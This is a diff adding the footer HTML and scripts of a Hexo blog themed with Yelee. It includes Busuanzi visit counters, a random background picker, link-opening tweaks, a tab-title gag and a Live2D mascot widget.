+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>|</span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+             title: "a.article-title, .article-more-link a", 
+             post: ".article-entry a[href], .copyright a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+             articleNav: "#article-nav a, #post-nav-button a", 
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+             menu: ".header-menu a", 
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":150},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
